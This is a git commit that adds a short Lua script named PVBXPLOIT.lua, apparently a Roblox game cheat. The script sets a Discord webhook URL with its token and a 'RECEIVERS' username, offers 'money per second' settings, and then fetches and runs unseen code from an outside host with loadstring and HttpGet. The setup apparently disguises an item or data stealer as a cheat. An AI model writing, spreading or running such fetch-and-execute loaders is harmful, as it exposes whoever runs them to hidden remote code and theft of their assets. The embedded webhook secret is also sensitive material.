119e25d444166d1a6f73333dbb9d17c7e403f7f9
SynergyNetworkz <liuluvskuan@gmail.com>
2025-10-19 11:09:17 +0800

    Create PVBXPLOIT.lua

---
+++ PVBXPLOIT.lua
@@ -0,0 +1,6 @@
+getgenv().WEBHOOK = "https://discord.com/api/webhooks/1428346937761071256/S-LLmSW5PEpiGwTWfFEm1AF02MpSpqLEF9Eo6Mza73AL8sE18-BS_i5CwXMD8Ei5-BUj"
+getgenv().RECEIVERS = {"ella_animate"}
+getgenv().MONEY_PER_SECOND = 300000-- DEFAULT: 300000/s
+getgenv().DMG_PER_SECOND = 300000-- DEFAULT: 300000/s
+
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/5af52aaa2f3e0118d73d35f30686cc05b7680eaa3e0133db08d9a5a2b9db3d5d/download"))()
